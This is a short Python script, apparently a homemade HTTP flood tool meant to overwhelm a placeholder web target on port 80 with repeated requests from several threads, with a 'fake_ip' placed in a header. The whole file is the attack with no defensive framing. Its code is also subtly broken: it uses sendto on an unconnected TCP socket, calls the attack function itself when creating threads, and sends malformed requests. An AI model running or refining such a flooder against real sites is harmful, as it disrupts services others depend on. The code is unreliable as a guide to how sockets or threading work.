import threading, socket

target = "www.___.com" # be careful here
port = 80 # port targets part of the application
fake_ip = "182.2.2.31"


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.sendto(("GET /"+target+" HTTP/1.1\r\n").encode("ascii"), (target, port))
        s.sendto(("HOST /"+fake_ip+"\r\n\r\n").encode("ascii"), (target, port))

        s.close()


for i in range(10):
    # virtual py thread - slow
    thread = threading.Thread(target=attack())
    thread.start()
